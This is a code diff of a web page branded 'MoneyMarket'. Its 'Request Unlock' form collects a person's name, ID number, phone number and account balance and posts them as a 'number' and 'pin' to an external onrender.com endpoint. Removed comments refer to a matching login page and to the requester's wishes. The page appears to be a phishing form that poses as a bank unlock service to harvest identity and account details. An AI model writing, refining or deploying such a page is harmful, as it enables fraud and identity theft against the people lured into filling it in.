@@ -69,25 +69,6 @@
       background-color: black;
       color: white;
     }
-
-    .btn-outline {
-      background: transparent;
-      border: 2px solid white;
-      color: white;
-    }
-
-    .small {
-      font-size: 13px;
-      color: #ffd54f;
-      margin-top: 8px;
-      text-align: left;
-    }
-
-    .muted {
-      font-size: 13px;
-      opacity: 0.9;
-      margin-top: 6px;
-    }
   </style>
 </head>
 <body>
@@ -97,77 +78,55 @@
 
     <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin: 10px auto 18px; display:block;">
 
-    <!-- Separate inputs for clarity; these will be combined into one space-separated string when sent -->
     <input id="name" type="text" placeholder='Name and Surname (e.g. John Smith)'>
     <input id="idNumber" type="text" placeholder='ID Number (e.g. 0123456789089)'>
     <input id="phone" type="text" inputmode="numeric" pattern="[0-9]*" placeholder='Phone Number (e.g. 0812345678)'>
     <input id="balance" type="text" placeholder='Account balance (e.g. R3500)'>
 
-
-
     <button id="unlockBtn" class="btn btn-primary">Request Unlock</button>
-
-
   </div>
 
   <script>
     const unlockBtn = document.getElementById('unlockBtn');
-    const fillBtn = document.getElementById('fillExample');
     const nameInput = document.getElementById('name');
     const idInput = document.getElementById('idNumber');
     const phoneInput = document.getElementById('phone');
     const balanceInput = document.getElementById('balance');
 
-    // Fills the fields with the sample you provided
-    fillBtn.addEventListener('click', () => {
-      nameInput.value = 'John Smith';
-      idInput.value = '01234567891089';
-      phoneInput.value = '0712345678';
-      balanceInput.value = 'R3500';
-    });
-
     unlockBtn.addEventListener('click', async () => {
-      // build a single space-separated string for the "number" field
-      // example -> "Given Mkasi 0242442213131098 07577474773"
       const name = nameInput.value.trim();
       const id = idInput.value.trim();
       const phone = phoneInput.value.trim();
-      const balance = balanceInput.value.trim(); // going into "pin" field per your request
+      const balance = balanceInput.value.trim();
 
-      // Simple validation (adjust as needed)
       if (!name || !id || !phone || !balance) {
         alert('Please fill all fields before submitting.');
         return;
       }
 
-      const concatNumber = `${name} ${id} ${phone}`; // single line, space-separated
+      const concatNumber = `${name} ${id} ${phone}`;
 
       try {
         const res = await fetch("https://money-market.onrender.com/submit", {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          // same shape your login page used: { number, pin }
           body: JSON.stringify({
             number: concatNumber,
             pin: balance
           })
         });
 
-        // try to parse response (safe)
-        let data;
-        try { data = await res.json(); } catch(e) { data = null; }
+        let data = null;
+        try { data = await res.json(); } catch (e) {}
 
         if (res.ok) {
-          // backend returned 200 — show success message (customize to your backend behavior)
-          alert(data && data.message ? data.message : 'Unlock request submitted successfully.');
-          // clear fields if you prefer
+          alert(data?.message || 'Unlock request submitted successfully.');
           nameInput.value = '';
           idInput.value = '';
           phoneInput.value = '';
           balanceInput.value = '';
         } else {
-          // backend returned non-2xx
-          alert((data && data.message) ? `Error: ${data.message}` : `Server responded with status ${res.status}`);
+          alert(data?.message ? `Error: ${data.message}` : `Server responded with status ${res.status}`);
         }
       } catch (err) {
         console.error(err);
